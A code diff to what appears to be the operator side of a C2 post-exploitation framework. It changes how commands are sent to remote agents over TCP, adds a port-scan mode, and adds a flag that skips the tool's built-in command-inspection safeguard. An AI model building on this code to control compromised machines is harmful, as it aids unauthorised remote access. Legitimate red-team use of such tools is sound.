@@ -66,18 +66,40 @@ def run_command_http(sid, cmd):
     except Exception as e:
         print(brightred + f"[-] ERROR failed to decode command output: {e}")
 
-def run_command_tcp(sid, cmd, timeout=0.5):
+def run_command_tcp(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False):
     session = session_manager.sessions[sid]
     meta = session.metadata
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
     client_socket = session.handler
     os_type = meta.get("os", "").lower()
-    
 
-    defender_state = defender.is_active
+    # ============================================================
+    # QUICK DRAIN: drop any stray bytes left over from a previous
+    # command, so they can't appear in our next read.
+    client_socket.settimeout(0.0)
+    client_socket.setblocking(False)
+    try:
+        while True:
+            chunk = client_socket.recv(1024 * 2000)
+            if not chunk:
+                break
+    except (socket.timeout, BlockingIOError, OSError):
+        pass
+
+    finally:
+        # put the timeout back for the real command
+        client_socket.setblocking(True)
+        client_socket.settimeout(timeout)
+    # =============================================
+    
+    try:
+        defender_state = defender.is_active
+
+    except Exception as e:
+        print(brightred + f"[!] An unknown error ocurred!")
 
     # === Session-Defender check ===
-    if defender_state:
+    if defender_state and not defender_bypass:
         if os_type in ("windows", "linux"):
             if not defender.inspect_command(os_type, cmd):
                 print(brightred + "[!] Command blocked by Session-Defender.")
@@ -92,6 +114,7 @@ def run_command_tcp(sid, cmd, timeout=0.5):
             
         client_socket.settimeout(timeout)
         response = b''
+        got_any = False
 
         while True:
             try:
@@ -101,8 +124,40 @@ def run_command_tcp(sid, cmd, timeout=0.5):
                     break
 
                 response += chunk
+                got_any = True
 
             except socket.timeout:
+                if portscan_active:
+                    if not got_any:
+                        continue
+
+                    else:
+                        sendback = response.decode(errors='ignore').strip()
+                        return sendback
+
+                if not got_any:
+                   # real timeout
+                   print(brightred + f"[!] Timeout waiting for response from agent {display}")
+                   return None
+
+                # we did get *some* data, now drain whatever's left
+                # save old blocking/timeout state
+                old_timeout = client_socket.gettimeout()
+                # switch to non-blocking
+                client_socket.setblocking(False)
+                try:
+                    while True:
+                        client_socket.recv(1024 * 2000)
+
+                except BlockingIOError:
+                    # no more data in the OS buffer
+                    pass
+
+                finally:
+                    # restore original state
+                    client_socket.setblocking(True)
+                    client_socket.settimeout(old_timeout)
+
                 break
 
         if global_tcpoutput_blocker == 1:
